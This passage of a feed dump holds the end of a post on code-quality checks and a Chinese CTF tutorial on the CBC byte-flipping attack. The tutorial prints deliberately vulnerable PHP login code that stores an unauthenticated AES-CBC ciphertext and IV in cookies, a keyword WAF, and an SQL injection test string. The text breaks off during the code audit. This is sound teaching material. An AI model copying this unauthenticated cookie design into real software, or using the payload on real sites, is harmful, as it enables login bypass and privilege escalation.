&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201903/1459059-20190326095333610-1337694808.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;第三道关，回归测试，这个环节就需要测试人员来协助老大一起怼你了，每次我们测试从我身边过我都瑟瑟发抖，生怕自己的bug出了代码，吓得我话都不会说了&lt;/p&gt;
&lt;p&gt;第四道关，代码评审（Code ReView）,这个环节是需要钛合金狗眼发挥作用的时刻了，一堆眼睛一起检查代码，以揪出被忽视的错误&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201903/1459059-20190326101115464-903891326.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后一关，代码分析（Code Analysis），静态代码分析（Static Code Analysis）是通过对源代码的检查来发现潜在问题的⼀种软件质量保障⽅式。有很多静态代码分析⼯具可以帮助检查代码缺陷&lt;em id=&quot;__mceDel&quot;&gt;，&lt;/em&gt;⽐如说商业软件Coverity&lt;em id=&quot;__mceDel&quot;&gt;，&lt;/em&gt;以及开源软件FindBugs，这关再过那怕是你又要在角落被人怼&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201903/1459059-20190326101414679-782536924.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;为了更好的活下去，我们一定要尽量把bug掐死在第一关，而不是在第一关就被bug斩下狗头&lt;/p&gt;
</description>
<pubDate>Tue, 26 Mar 2019 07:26:00 +0000</pubDate>
<dc:creator>一只菜鸟攻城狮啊</dc:creator>
<og:description>昨天拜读了范学雷老师的代码精进之路第一篇，很有感悟，今天继续来读一读第二篇，昨晚想多看几篇的，结果去健身耽搁了，话说运动运动有点舒服，据说多运动肾好也不知道真的假的，话不多说我们说正事（又有点击查看源</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/suihang/p/10598291.html</dc:identifier>
</item>
<item>
<title>CBC 字节反转攻击 - Pretty_girll</title>
<link>http://www.cnblogs.com/prettygirll/p/10595591.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/prettygirll/p/10595591.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;一、CBC 简介&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;现代密码体制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;现代密码中的加密体制一般分为对称加密体制(Symmetric Key Encryption)和非对称加密体制(Asymmetric Key Encryption)。对称加密又分为分组加密和序列密码。&lt;br/&gt;分组密码：也叫块加密(block cyphers)，一次加密明文中的一个块。是将明文按一定的位长分组，明文组经过加密运算得到密文组，密文组经过解密运算（加密运算的逆运算），还原成明文组，有 ECB、CBC、CFB、OFB 四种工作模式。&lt;br/&gt;序列密码：也叫流加密(stream cyphers)，一次加密明文中的一个位。是指利用少量的密钥（制乱元素）通过某种复杂的运算（密码算法）产生大量的伪随机位流，用于对明文位流的加密。解密是指用同样的密钥和密码算法及与加密相同的伪随机位流，用以还原明文位流。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CBC 模式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CBC (Cipher Block Chaining, 密码分组链接) 模式中每一个分组要先和前一个分组加密后的数据进行XOR异或操作，然后再进行加密。这样每个密文块依赖该块之前的所有明文块，为了保持每条消息都具有唯一性，第一个数据块进行加密之前需要用初始化向量IV进行异或操作。CBC模式是一种最常用的加密模式，它主要缺点是加密是连续的，不能并行处理，并且与ECB一样消息块必须填充到块大小的整倍数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CBC 模式的优缺点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CBC算法优点：&lt;br/&gt;串行运算、相同明文不同密文。&lt;br/&gt;CBC算法缺点：&lt;br/&gt;需要初始向量、加密是连续的，不能并行处理。 &lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;二、CBC 工作模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Encryption&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325171911202-601116434.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;特殊名词&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Plaintext：明文，待加密的数据。&lt;br/&gt;IV ：初始向量，用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。&lt;br/&gt;Key：对称密钥，由AES，Blowfish，DES，Triple DES等对称加密算法使用。&lt;br/&gt;Ciphertext：密文数据。&lt;br/&gt;固定分组：CBC在一个固定长度的位组上工作，称为块。这里使用每个16字节的块进行讲解。&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;Encryption process&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、文字流程&lt;/p&gt;
&lt;p&gt;Main：上一组密文块用来产生下一组密文块。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1、首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。
2、生成一个随机的初始化向量(IV)和一个密钥。
3、将IV和第一组明文异或产生初步密文，再用密钥对初步密文加密生成最终密文块。
4、用3中产生的密文块对第二组明文进行xor操作产生初步密文，再用密钥对初步密文加密生成最终密文块。
5、重复4，到最后一组明文。
6、将IV和加密后的每个密文块拼接在一起，得到最终的密文。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;从第一块 Plaintext 开始，首先与一个初始向量iv异或（iv只在第一处起作用），然后把异或的结果经过key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。&lt;br/&gt;2、公式描述：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块
Ciphertext-N = Encrypt(Plaintext XOR Ciphertext-(N-1))—用于第二及剩下的组块  # N &amp;gt; 1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Decryption：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190324172054602-1165374815.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;Decryption&lt;/strong&gt; process&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 1、文字流程&lt;/p&gt;
&lt;p&gt;Main：上一组密文块影响下一组密文块的还原。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1、从密文中提取出IV，然后将密文分组。
2、使用密钥对第一组的密文解密，然后和IV进行xor得到明文。
3、使用密钥对第二组密文解密，然后和2中的密文xor得到明文。
4、重复2-3，直到最后一组密文。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;解密和加密的原理是一样的，都是&lt;/p&gt;
&lt;p&gt;2、公式描述：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块
Plaintext-N = Decrypt(Ciphertext) XOR Ciphertext-(N-1)—用于第二及剩下的组块   &lt;/span&gt;# N &amp;gt; 1
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;三、CBC 攻击原理&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack 原理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、在 CBC 解密的公式中可以注意到Ciphertext-(N-1)用来产生下一块明文，这就是字节翻转攻击发挥作用的地方。如果我们改变Ciphertext-N-1中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。&lt;/p&gt;
&lt;p&gt;2、在1中的基础上，通过破坏密文中的字节来改变明文中的字节，由此在破坏的密文中添加单引号等恶意字符来绕过过滤器，或通过将用户ID更改为admin来提升权限，或者更改应用程序所需的明文造成其他后果。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack process&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325184205372-1328277298.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过修改第一组的密文块字节，来构造自己想要的第二组明文块，当第一组密文块字节发生改变时会影响第一组明文块和第二组明文块。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;四、漏洞复现&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;漏洞源码  (漏洞复现以 CTF 为例)&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;include&lt;/span&gt; 'sqlwaf.php'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;define&lt;/span&gt;(&quot;SECRET_KEY&quot;, &quot;Dfa5cUiJb2Xquhgv&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;define&lt;/span&gt;(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;session_start&lt;/span&gt;&lt;span&gt;();

&lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; get_random_iv(){
    &lt;/span&gt;&lt;span&gt;$iv&lt;/span&gt;=''&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;$i&lt;/span&gt;=0;&lt;span&gt;$i&lt;/span&gt;&amp;lt;16;&lt;span&gt;$i&lt;/span&gt;++&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;$iv&lt;/span&gt;.=&lt;span&gt;chr&lt;/span&gt;(&lt;span&gt;rand&lt;/span&gt;(1,255&lt;span&gt;));
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$iv&lt;/span&gt;&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt; login(&lt;span&gt;$info&lt;/span&gt;&lt;span&gt;){
    &lt;/span&gt;&lt;span&gt;$iv&lt;/span&gt;=&lt;span&gt;get_random_iv();
    &lt;/span&gt;&lt;span&gt;$plain&lt;/span&gt; = &lt;span&gt;serialize&lt;/span&gt;(&lt;span&gt;$info&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;$cipher&lt;/span&gt; = openssl_encrypt(&lt;span&gt;$plain&lt;/span&gt;, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, &lt;span&gt;$iv&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;$_SESSION&lt;/span&gt;['username'] = &lt;span&gt;$info&lt;/span&gt;['username'&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;setcookie&lt;/span&gt;(&quot;iv&quot;, &lt;span&gt;base64_encode&lt;/span&gt;(&lt;span&gt;$iv&lt;/span&gt;&lt;span&gt;));
    &lt;/span&gt;&lt;span&gt;setcookie&lt;/span&gt;(&quot;cipher&quot;, &lt;span&gt;base64_encode&lt;/span&gt;(&lt;span&gt;$cipher&lt;/span&gt;&lt;span&gt;));
}
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; show_homepage(){
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;$_SESSION&lt;/span&gt;[&quot;username&quot;]==='admin'&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;Hello admin&amp;lt;/p&amp;gt;'&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;Flag is CBC{CBC is a good thing ! ! !}&amp;lt;/p&amp;gt;'&lt;span&gt;;
    }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;hello '.&lt;span&gt;$_SESSION&lt;/span&gt;['username'].'&amp;lt;/p&amp;gt;'&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;Only admin can see flag&amp;lt;/p&amp;gt;'&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;&amp;lt;a href=&quot;loginout.php&quot;&amp;gt;Log out&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;'&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;&lt;span&gt;();
}
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; check_login(){
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_COOKIE&lt;/span&gt;['cipher']) &amp;amp;&amp;amp; &lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_COOKIE&lt;/span&gt;['iv'&lt;span&gt;])){
        &lt;/span&gt;&lt;span&gt;$cipher&lt;/span&gt; = &lt;span&gt;base64_decode&lt;/span&gt;(&lt;span&gt;$_COOKIE&lt;/span&gt;['cipher'&lt;span&gt;]);
        &lt;/span&gt;&lt;span&gt;$iv&lt;/span&gt; = &lt;span&gt;base64_decode&lt;/span&gt;(&lt;span&gt;$_COOKIE&lt;/span&gt;[&quot;iv&quot;&lt;span&gt;]);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;$plain&lt;/span&gt; = openssl_decrypt(&lt;span&gt;$cipher&lt;/span&gt;, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, &lt;span&gt;$iv&lt;/span&gt;&lt;span&gt;)){
            &lt;/span&gt;&lt;span&gt;$info&lt;/span&gt; = &lt;span&gt;unserialize&lt;/span&gt;(&lt;span&gt;$plain&lt;/span&gt;) or &lt;span&gt;die&lt;/span&gt;(&quot;&amp;lt;p&amp;gt;base64_decode('&quot;.&lt;span&gt;base64_encode&lt;/span&gt;(&lt;span&gt;$plain&lt;/span&gt;).&quot;') can't unserialize&amp;lt;/p&amp;gt;&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;$_SESSION&lt;/span&gt;['username'] = &lt;span&gt;$info&lt;/span&gt;['username'&lt;span&gt;];
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;(&quot;ERROR!&quot;&lt;span&gt;);
        }
    }
}

&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_POST&lt;/span&gt;['username'])&amp;amp;&amp;amp;&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_POST&lt;/span&gt;['password'&lt;span&gt;])) {
  &lt;/span&gt;&lt;span&gt;$username&lt;/span&gt;=waf((&lt;span&gt;string&lt;/span&gt;)&lt;span&gt;$_POST&lt;/span&gt;['username'&lt;span&gt;]);
  &lt;/span&gt;&lt;span&gt;$password&lt;/span&gt;=waf((&lt;span&gt;string&lt;/span&gt;)&lt;span&gt;$_POST&lt;/span&gt;['password'&lt;span&gt;]);
  &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;$username&lt;/span&gt; === 'admin'&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;exit&lt;/span&gt;('&amp;lt;p&amp;gt;You are not real admin!&amp;lt;/p&amp;gt;'&lt;span&gt;);
    }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;$info&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;('username'=&amp;gt;&lt;span&gt;$username&lt;/span&gt;,'password'=&amp;gt;&lt;span&gt;$password&lt;/span&gt;&lt;span&gt;);
        login(&lt;/span&gt;&lt;span&gt;$info&lt;/span&gt;&lt;span&gt;);
        show_homepage();
    }
}
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
  &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_SESSION&lt;/span&gt;[&quot;username&quot;&lt;span&gt;])){
        check_login();
        show_homepage();
    }
}
&lt;/span&gt;?&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot; &amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
  &amp;lt;title&amp;gt;Paper login form&amp;lt;/title&amp;gt;
      &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
  &amp;lt;div id=&quot;login&quot;&amp;gt;
  &amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;
    &amp;lt;h1&amp;gt;Sign In&amp;lt;/h1&amp;gt;
    &amp;lt;input name='username' type=&quot;text&quot; placeholder=&quot;Username&quot;&amp;gt;
    &amp;lt;input name='password' type=&quot;password&quot; placeholder=&quot;Password&quot;&amp;gt;
    &amp;lt;button&amp;gt;Sign in&amp;lt;/button&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;waf 源码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt; waf(&lt;span&gt;$str&lt;/span&gt;&lt;span&gt;){
&lt;/span&gt;&lt;span&gt;$array&lt;/span&gt;=&lt;span&gt;array&lt;/span&gt;(&quot;'&quot;,&quot;\&quot;&quot;,&quot; &quot;,&quot;or&quot;,&quot;and&quot;,&quot;(&quot;,&quot;)&quot;,&quot;&amp;lt;&quot;,&quot;?&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;$i&lt;/span&gt;=0; &lt;span&gt;$i&lt;/span&gt; &amp;lt; &lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;$array&lt;/span&gt;); &lt;span&gt;$i&lt;/span&gt;++&lt;span&gt;) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;strpos&lt;/span&gt;(&lt;span&gt;$str&lt;/span&gt;,&lt;span&gt;$array&lt;/span&gt;[&lt;span&gt;$i&lt;/span&gt;&lt;span&gt;])){
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;&amp;lt;script&amp;gt;alert('too young too simple,do not hack')&amp;lt;/script&amp;gt;&quot;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;&lt;span&gt;();
    }
}
&lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$str&lt;/span&gt;&lt;span&gt;;
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;题目Hint：Only admin can see flag！ &lt;/p&gt;
&lt;p&gt;初始页面显示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325211839751-96093024.png&quot; alt=&quot;&quot; width=&quot;468&quot; height=&quot;319&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过测试发现存在 Injection  Bypass&lt;/p&gt;
&lt;p&gt;测试&lt;/p&gt;
&lt;p&gt;username：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
admin' or '1'='1
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;password：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
Random：**********
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325213626054-1612811775.png&quot; alt=&quot;&quot; width=&quot;458&quot; height=&quot;302&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Result &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325214045540-405707759.png&quot; alt=&quot;&quot; width=&quot;454&quot; height=&quot;263&quot;/&gt;&lt;/p&gt;
&lt;p&gt;测试发现存在注入绕过，通过扫描网站意外发现存在网页Bak文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325214458539-918281947.png&quot; alt=&quot;&quot; width=&quot;556&quot; height=&quot;381&quot;/&gt;&lt;/p&gt;
&lt;p&gt;将Bak文件Down下来，进行代码审计&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;include&lt;/span&gt; 'sqlwaf.php'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;define&lt;/span&gt;(&quot;SECRET_KEY&quot;, &quot;Dfa5cUiJb2Xquhgv&quot;);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;密钥key&lt;/span&gt;
&lt;span&gt;define&lt;/span&gt;(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;使用AES算法128bit固定分组&lt;/span&gt;
&lt;span&gt;session_start&lt;/span&gt;&lt;span&gt;();

&lt;/span&gt;&lt;span&gt;function&lt;/span&gt; get_random_iv(){    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;初始化向量IV&lt;/span&gt;
    &lt;span&gt;$iv&lt;/span&gt;=''&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;$i&lt;/span&gt;=0;&lt;span&gt;$i&lt;/span&gt;&amp;lt;16;&lt;span&gt;$i&lt;/span&gt;++){   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;随机生成16字节长度的IV&lt;/span&gt;
        &lt;span&gt;$iv&lt;/span&gt;.=&lt;span&gt;chr&lt;/span&gt;(&lt;span&gt;rand&lt;/span&gt;(1,255&lt;span&gt;));  
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$iv&lt;/span&gt;&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt; login(&lt;span&gt;$info&lt;/span&gt;&lt;span&gt;){   
    &lt;/span&gt;&lt;span&gt;$iv&lt;/span&gt;=get_random_iv();       &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取经过初始化的向量IV&lt;/span&gt;
    &lt;span&gt;$plain&lt;/span&gt; = &lt;span&gt;serialize&lt;/span&gt;(&lt;span&gt;$info&lt;/span&gt;);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;将用户提交的信息进行序列化&lt;/span&gt;
    &lt;span&gt;$cipher&lt;/span&gt; = openssl_encrypt(&lt;span&gt;$plain&lt;/span&gt;, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, &lt;span&gt;$iv&lt;/span&gt;);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;将变量$plain的值进行加密&lt;/span&gt;
    &lt;span&gt;$_SESSION&lt;/span&gt;['username'] = &lt;span&gt;$info&lt;/span&gt;['username'];  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取用户提交的用户名&lt;/span&gt;
    &lt;span&gt;setcookie&lt;/span&gt;(&quot;iv&quot;, &lt;span&gt;base64_encode&lt;/span&gt;(&lt;span&gt;$iv&lt;/span&gt;));    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置cookie:iv、cipher并将其值进行base64编码&lt;/span&gt;
    &lt;span&gt;setcookie&lt;/span&gt;(&quot;cipher&quot;, &lt;span&gt;base64_encode&lt;/span&gt;(&lt;span&gt;$cipher&lt;/span&gt;&lt;span&gt;));
}
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt; show_homepage(){      &lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断网页提交的用户是否是&quot;admin&quot;&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;$_SESSION&lt;/span&gt;[&quot;username&quot;]==='admin'){  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;只有admin用户才能查看Flag&lt;/span&gt;
        &lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;Hello admin&amp;lt;/p&amp;gt;'&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;Flag is CBC{CBC is a good thing ! ! !}&amp;lt;/p&amp;gt;'&lt;span&gt;;
    }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;hello '.&lt;span&gt;$_SESSION&lt;/span&gt;['username'].'&amp;lt;/p&amp;gt;';  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果不是admin用户，网页则会显示&quot;hello &amp;lt;username&amp;gt;&quot; &lt;/span&gt;
        &lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;Only admin can see flag&amp;lt;/p&amp;gt;';  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;查询失败&lt;/span&gt;
&lt;span&gt;    }
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; '&amp;lt;p&amp;gt;&amp;lt;a href=&quot;loginout.php&quot;&amp;gt;Log out&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;'&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;&lt;span&gt;();
}
&lt;/span&gt;&lt;span&gt;function&lt;/span&gt; check_login(){    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;检查cookie：iv、cipher并将其值进行base64解码&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_COOKIE&lt;/span&gt;['cipher']) &amp;amp;&amp;amp; &lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_COOKIE&lt;/span&gt;['iv'&lt;span&gt;])){
        &lt;/span&gt;&lt;span&gt;$cipher&lt;/span&gt; = &lt;span&gt;base64_decode&lt;/span&gt;(&lt;span&gt;$_COOKIE&lt;/span&gt;['cipher'&lt;span&gt;]);
        &lt;/span&gt;&lt;span&gt;$iv&lt;/span&gt; = &lt;span&gt;base64_decode&lt;/span&gt;(&lt;span&gt;$_COOKIE&lt;/span&gt;[&quot;iv&quot;&lt;span&gt;]);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;$plain&lt;/span&gt; = openssl_decrypt(&lt;span&gt;$cipher&lt;/span&gt;, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, &lt;span&gt;$iv&lt;/span&gt;)){  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;将cipher进行解密&lt;/span&gt;
            &lt;span&gt;$info&lt;/span&gt; = &lt;span&gt;unserialize&lt;/span&gt;(&lt;span&gt;$plain&lt;/span&gt;) or &lt;span&gt;die&lt;/span&gt;(&quot;&amp;lt;p&amp;gt;base64_decode('&quot;.&lt;span&gt;base64_encode&lt;/span&gt;(&lt;span&gt;$plain&lt;/span&gt;).&quot;') can't  unserialize&amp;lt;/p&amp;gt;&quot;); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果对变量$plain的值反序列化失败则会退出整个程序的执行&lt;/span&gt;
            &lt;span&gt;$_SESSION&lt;/span&gt;['username'] = &lt;span&gt;$info&lt;/span&gt;['username'];  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;//获取用户名&lt;/span&gt;
        }&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;(&quot;ERROR!&quot;&lt;span&gt;);
        }
    }
}

&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_POST&lt;/span&gt;['username'])&amp;amp;&amp;amp;&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_POST&lt;/span&gt;['password'])) {   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断用户的输入&lt;/span&gt;
  &lt;span&gt;$username&lt;/span&gt;=waf((&lt;span&gt;string&lt;/span&gt;)&lt;span&gt;$_POST&lt;/span&gt;['username']);   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;对用户名进行安全检测&lt;/span&gt;
  &lt;span&gt;$password&lt;/span&gt;=waf((&lt;span&gt;string&lt;/span&gt;)&lt;span&gt;$_POST&lt;/span&gt;['password']);   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;对用户密码进行安全检测&lt;/span&gt;
